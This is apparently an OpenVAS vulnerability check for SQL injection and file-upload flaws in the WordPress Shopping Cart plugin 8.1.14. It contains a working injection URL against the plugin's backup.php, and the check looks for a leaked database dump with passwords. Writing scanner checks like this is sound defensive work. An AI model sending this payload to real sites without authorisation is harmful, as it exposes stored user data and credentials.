###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Shopping Cart Plugin Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803208");
  script_version("2023-03-01T10:20:04+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2013-01-17 12:52:02 +0530 (Thu, 17 Jan 2013)");
  script_name("WordPress Shopping Cart Plugin Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/51690");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57101");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/80932");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/119217/WordPress-Shopping-Cart-8.1.14-Shell-Upload-SQL-Injection.html");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to gain sensitive
  information or to upload arbitrary PHP code and run it in the context of
  the Web server process.");
  script_tag(name:"affected", value:"WordPress Shopping Cart plugin version 8.1.14");
  script_tag(name:"insight", value:"Input passed via the 'reqID' parameter to backup.php, dbuploaderscript.php,
  exportsubscribers.php, emailimageuploaderscript.php and
  productuploaderscript.php is not properly sanitised which allows to
  execute SQL commands or upload files with arbitrary extensions to a folder
  inside the webroot.");
  script_tag(name:"solution", value:"Update to the WordPress Shopping Cart Plugin 8.1.15 or later.");
  script_tag(name:"summary", value:"WordPress Shopping Cart Plugin is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/levelfourstorefront/");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/levelfourstorefront/scripts/administration/" +
            "backup.php?reqID=1%27%20or%201=%271";

if(http_vuln_check(port:port, url:url, check_header:TRUE,
                   pattern:"CREATE TABLE",
                   extra_check: make_list('DROP TABLE', 'user_id',
                   'ClientID', 'Password')))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
